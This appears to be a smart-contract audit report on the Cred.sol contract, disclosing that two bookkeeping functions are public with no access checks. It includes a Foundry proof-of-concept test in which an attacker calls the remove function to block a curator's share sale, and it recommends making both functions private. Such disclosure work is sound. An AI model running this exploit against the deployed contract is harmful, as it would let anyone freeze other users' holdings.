# Vulnerability details

## Vulnerability details

Functions `_addCredIdPerAddress` and `_removeCredIdPerAddress` in the contract [Cred.sol](https://github.com/code-423n4/2024-08-phi/blob/main/src/Cred.sol#L685-L729) have `public` visibility. 
```solidity
function _addCredIdPerAddress(uint256 credId_, address sender_) public {...}

function _removeCredIdPerAddress(uint256 credId_, address sender_) public {...}
```
The vulnerability is that anyone can call these functions with any `curator` address and `credId`, thus adding `credId` to users and deleting them accordingly. There are **no checks** inside the function to ensure that `msg.sender` owns this `credId`

The `removeCredIdPerAddress` function is **very dangerous** for the contract, as it is called inside the `_updateCuratorShareBalance` (updates the curator's balance) function when selling, which in turn is called in the `_handleTrade` (**Key function of this contract**) and `_executeBatchTrade` functions.

## Impact

The curator owns a certain amount of `credId` and has a corresponding share. The attacker calmly calls the `_removeCredIdPerAddress` function and removes all tokens or a specific one from the mappings. When the curator wants to sell his share, calling the `_updateCuratorShareBalance` function will return an error, because the requirements in the `_removeCredIdPerAddress` function are not fulfilled.

## Proof of Concept
Paste this test into the main `Cred.t.sol` test 

```solidity
function test_revertErrorSale() public {

_createCred("BASIC", "SIGNATURE", 0x0);

_createCred("ADVANCED", "SIGNATURE", 0x0);

uint256 buyPrice1 = bondingCurve.getBuyPriceAfterFee(1, 1, 2);

uint256 buyPrice2 = bondingCurve.getBuyPriceAfterFee(2, 1, 2);

  

vm.startPrank(anyone);

  

cred.buyShareCredFor{ value: buyPrice1 }(1, 1, address(anyone), 0);

cred.buyShareCredFor{ value: buyPrice2 }(2, 1, address(anyone), 0);

  

vm.warp(block.timestamp + 20 minutes); //Need to pass the time unlock

  

vm.stopPrank();

  

vm.startPrank(attacker); //add this address to the Setting.sol contract (attacker = makeAddr((‘attacker’)));))

  

cred._removeCredIdPerAddress(1, address(anyone));

cred._removeCredIdPerAddress(2, address(anyone));

  

vm.stopPrank();

  

vm.startPrank(anyone);

vm.expectRevert(ICred.EmptyArray.selector);

cred.sellShareCred(1, 1, 0);

}
```

## Recommended Mitigation Steps

change the visibility of functions to `private`

```diff
- function _addCredIdPerAddress(uint256 credId_, address sender_) public {...}
+ function _addCredIdPerAddress(uint256 credId_, address sender_) private {...}
  
- function _removeCredIdPerAddress(uint256 credId_, address sender_) public {...}
+ function _removeCredIdPerAddress(uint256 credId_, address sender_) private {...}

```
